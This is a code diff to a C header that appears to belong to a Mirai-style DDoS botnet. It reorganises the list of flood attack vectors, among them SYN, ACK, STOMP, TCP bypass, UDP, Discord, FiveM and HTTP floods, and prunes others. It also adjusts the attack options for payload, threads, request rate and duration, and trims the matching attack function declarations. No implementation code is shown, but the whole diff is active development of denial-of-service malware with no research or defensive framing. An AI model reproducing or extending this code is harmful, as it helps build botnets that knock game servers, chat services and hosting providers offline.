@@ -42,28 +42,27 @@ struct Attack {
     uint8_t opts_len;
     struct attack_option *opts;
 };
+
+// TCP vectors
 #define ATK_VEC_SYN         0
-#define ATK_VEC_UDP_FLOOD   1
-#define ATK_VEC_NUDP        2
-#define ATK_VEC_VSE         3
-#define ATK_VEC_GREIP       4
-#define ATK_VEC_ACK         5
-#define ATK_VEC_SACK2       6
+#define ATK_VEC_ACK         1
+#define ATK_VEC_SACK2       2
+#define ATK_VEC_SOCKET      3
+#define ATK_VEC_STOMP       4
+#define ATK_VEC_TCPBYPASS   5
+
+// UDP vectors
+#define ATK_VEC_UDP_FLOOD   6
 #define ATK_VEC_STDHEX      7
-#define ATK_VEC_SOCKET      8 
-#define ATK_VEC_STREAM      9
-#define ATK_VEC_TCPWRA      10
-#define ATK_VEC_OVH         11
-#define ATK_VEC_STOMP       12
-#define ATK_VEC_HTTP        13
-#define ATK_VEC_TCPBYPASS   14
-#define ATK_VEC_NFO         15
-#define ATK_VEC_UDP_PLAIN   16
-#define ATK_VEC_GAME        17
-#define ATK_VEC_DISCORD     18
-#define ATK_VEC_FIVEM       19
+#define ATK_VEC_UDP_PLAIN   8
+#define ATK_VEC_DISCORD     9
+#define ATK_VEC_FIVEM       10
+
+// HTTP vector
+#define ATK_VEC_HTTP        11
 
 
+//FLAGS
 
 #define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
 #define ATK_OPT_PAYLOAD_RAND    1   // Should we randomize the packet data contents?
@@ -75,7 +74,7 @@ struct Attack {
 #define ATK_OPT_DPORT           7   // Should we force a dest port? (0 = random)
 #define ATK_OPT_DOMAIN          8   // Domain name for DNS attack
 #define ATK_OPT_DNS_HDR_ID      9   // Domain name header ID
-//#define ATK_OPT_TCPCC           10  // TCP congestion control
+//#define ATK_OPT_TCPCC         10  // TCP congestion control
 #define ATK_OPT_URG             11  // TCP URG header flag
 #define ATK_OPT_ACK             12  // TCP ACK header flag
 #define ATK_OPT_PSH             13  // TCP PSH header flag
@@ -95,19 +94,21 @@ struct Attack {
 #define ATK_OPT_MAX_SIZE        27  // maximum packet size
 #define ATK_OPT_PAYLOAD_ONE     28  // custom payload
 #define ATK_OPT_PAYLOAD_REPEAT  29  //How many times to repeat custom payload in packet (for UDP, TCP, and GRE floods)
-#define ATK_OPT_RAND_LEN        30   // o cualquier número no usado
 #define ATK_OPT_KEEPALIVE       31
 #define ATK_OPT_RANDOMIZE       32
 #define ATK_OPT_RPS             33
 #define ATK_OPT_THREADS         34
 #define ATK_OPT_DURATION        35
 #define ATK_OPT_FIVEM_PORT      36
+#define ATK_OPT_RAND_LEN        37
 
 
 struct attack_method {
     ATTACK_FUNC func;
     ATTACK_VECTOR vector;
 };
+
+// HTTP FLAGS
 
 #define HTTP_CONN_INIT          0 // Inital state
 #define HTTP_CONN_RESTART       1 // Scheduled to restart connection next spin
@@ -180,22 +181,14 @@ uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
 
 void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_thread(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_nudp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_tcp_sack2(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_stdhex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_socket(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_tcpstream(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_wraflood(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_ovh(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_tcp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_nfo(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_game(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_discord(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_fivem(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
